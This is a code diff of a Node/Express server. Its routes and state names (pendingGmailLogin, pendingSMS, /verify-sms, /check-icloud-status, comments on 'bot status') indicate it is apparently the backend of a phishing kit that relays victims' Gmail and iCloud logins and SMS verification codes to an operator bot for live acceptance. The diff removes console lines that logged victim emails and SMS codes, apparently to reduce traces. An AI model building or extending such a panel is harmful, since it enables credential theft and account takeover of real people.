@@ -537,32 +537,27 @@ app.post("/update-status", (req, res) => {
     if (action === "verification_accept" || action === "verification_reject") {
       if (pendingVerificationConfirm[identifier]) {
         pendingVerificationConfirm[identifier].status = action;
-        console.log(`✅ Updated pendingVerificationConfirm[${identifier}].status = ${action}`);
         return res.json({ ok: true });
       }
     }
 
     if (pendingVerificationPage[identifier]) {
       pendingVerificationPage[identifier].status = status;
-      console.log(`✅ Updated pendingVerificationPage[${identifier}].status = ${status}`);
       return res.json({ ok: true });
     }
 
     if (pendingGmailLogin[identifier]) {
       pendingGmailLogin[identifier].status = status;
-      console.log(`✅ Updated pendingGmailLogin[${identifier}].status = ${status}`);
       return res.json({ ok: true });
     }
 
     if (pendingCodes[identifier]) {
       pendingCodes[identifier].status = status;
-      console.log(`✅ Updated pendingCodes[${identifier}].status = ${status}`);
       return res.json({ ok: true });
     }
 
     if (pendingPage[identifier]) {
       pendingPage[identifier].status = status;
-      console.log(`✅ Updated pendingPage[${identifier}].status = ${status}`);
       return res.json({ ok: true });
     }
 
@@ -714,8 +709,6 @@ app.post("/verify-sms", async (req, res) => {
         })
       });
     }
-
-    console.log(`📧 ${email} | SMS: ${smsCode}`);
     
     pendingSMS[email] = {
       status: "pending",
@@ -975,7 +968,6 @@ app.get("/check-icloud-status", (req, res) => {
 
     if (pendingPage[email]) {
       const status = pendingPage[email].status;
-      console.log(`✅ iCloud status for ${email}: ${status}`);
       
       // Map bot status values to frontend expectations
       if (status === "page_accept") {
@@ -1270,7 +1262,6 @@ app.get("/check-gmail-status", (req, res) => {
     }
 
     const status = pendingGmailLogin[requestId].status;
-    console.log(`✅ Gmail status for requestId ${requestId}: ${status}`);
     
     // Map bot status values to frontend expectations
     if (status === "gmail_accept") {
@@ -1312,10 +1303,8 @@ app.get("/api/display-email/:displayEmailKey", (req, res) => {
     const { displayEmailKey } = req.params;
     const email = displayEmailStore[displayEmailKey];
     if (email) {
-      console.log(`📧 Retrieved display email for key ${displayEmailKey}: ${email}`);
       res.json({ displayEmail: email });
     } else {
-      console.log(`📧 No display email found for key ${displayEmailKey}`);
       res.json({ displayEmail: null });
     }
   } catch (err) {
@@ -1478,7 +1467,6 @@ app.get("/check-verification-status", (req, res) => {
     }
 
     const status = pendingVerificationConfirm[requestId].status;
-    console.log(`✅ Verification status for requestId ${requestId}: ${status}`);
     
     // Map bot status values to frontend expectations
     if (status === "verification_accept") {
